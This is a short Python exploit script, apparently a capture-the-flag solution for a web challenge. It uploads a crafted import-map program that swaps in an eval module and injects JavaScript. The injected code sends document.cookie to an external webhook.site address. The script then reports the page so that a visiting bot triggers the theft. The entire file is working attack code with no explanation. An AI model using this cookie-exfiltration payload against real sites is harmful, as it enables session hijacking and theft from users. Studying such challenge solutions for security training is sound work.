#!/usr/bin/env python3

import requests
import json

target_url = "http://yaca.chal.pwni.ng:5028"
my_url = "https://webhook.site/xxx"

data = {
    'type': 'importmap',
    'program': {
        'imports': {
            '/js/ast-to-js.mjs': '/js/eval-code.mjs'
        },
        'name': 'give me the flag pls~~',
        'code': json.dumps({
            'code': f'new Image().src="{my_url}/?leak=" + encodeURIComponent(document.cookie)',
            'variables': []
        })
        
    } 
}

r = requests.post(target_url + "/upload", json=data)

PayloadPage = r.text

if '/program/' not in PayloadPage:
    print("Something went wrong!!")
else:
    print(f"Please access {target_url}{PayloadPage} from the browser!!")
    requests.post(target_url + "/report", json={'file': PayloadPage[9:]})